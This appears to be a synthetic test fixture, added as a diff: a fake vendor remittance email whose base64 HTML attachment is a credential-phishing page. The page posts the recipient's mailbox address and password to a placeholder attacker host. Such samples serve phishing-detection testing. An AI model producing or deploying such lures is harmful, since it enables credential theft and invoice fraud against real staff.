@@ -1,0 +1,43 @@
+Received: from mail.vendor-f-remit.example (mail.vendor-f-remit.example
+ [192.0.2.10]) by mx.example.net with ESMTPS id ho-attach-html-phish; Thu, 08
+ Oct 2026 10:05:00 +0000
+From: Vendor F Payments <payments@vendor-f-remit.example>
+To: ap@acme.example
+Subject: Remittance advice: payment 1093 released
+Date: Thu, 08 Oct 2026 10:05:00 +0000
+Message-ID: <ho-attach-html-phish.60caf8f399@synthetic.acme.example>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="=_ecf_ho-attach-html-phish_0"
+
+--=_ecf_ho-attach-html-phish_0
+Content-Type: text/plain; charset="utf-8"
+Content-Transfer-Encoding: quoted-printable
+
+Hello,
+
+A payment to your organisation has been released. The remittance advice is at=
+tached as
+a secure document: open it in your browser and confirm your mailbox details t=
+o view it.
+
+Vendor F Payments
+555-0144
+
+--=_ecf_ho-attach-html-phish_0
+Content-Type: text/html
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename="Remittance_Advice_1093.html"
+MIME-Version: 1.0
+
+PGh0bWw+PGhlYWQ+PHRpdGxlPlNlY3VyZSBkb2N1bWVudDwvdGl0bGU+PC9oZWFkPgo8Ym9keSBz
+dHlsZT0iZm9udC1mYW1pbHk6QXJpYWwsc2Fucy1zZXJpZjt0ZXh0LWFsaWduOmNlbnRlcjtwYWRk
+aW5nLXRvcDo0MHB4Ij4KICA8aDI+UmVtaXR0YW5jZSBhZHZpY2UgMTA5MzwvaDI+CiAgPHA+VGhp
+cyBkb2N1bWVudCBpcyBwcm90ZWN0ZWQuIENvbmZpcm0gdGhlIG1haWxib3ggaXQgd2FzIHNlbnQg
+dG8uPC9wPgogIDxmb3JtIG1ldGhvZD0icG9zdCIgYWN0aW9uPSJodHRwczovL3ZlbmRvci1mLXJl
+bWl0LmV4YW1wbGUvdW5sb2NrIj4KICAgIDxpbnB1dCB0eXBlPSJlbWFpbCIgbmFtZT0idXNlciIg
+dmFsdWU9ImFwQGFjbWUuZXhhbXBsZSI+PGJyPjxicj4KICAgIDxpbnB1dCB0eXBlPSJwYXNzd29y
+ZCIgbmFtZT0icGFzcyIgcGxhY2Vob2xkZXI9Ik1haWxib3ggcGFzc3dvcmQiPjxicj48YnI+CiAg
+ICA8YnV0dG9uIHR5cGU9InN1Ym1pdCI+VmlldyBkb2N1bWVudDwvYnV0dG9uPgogIDwvZm9ybT4K
+PC9ib2R5PjwvaHRtbD4K
+
+--=_ecf_ho-attach-html-phish_0--
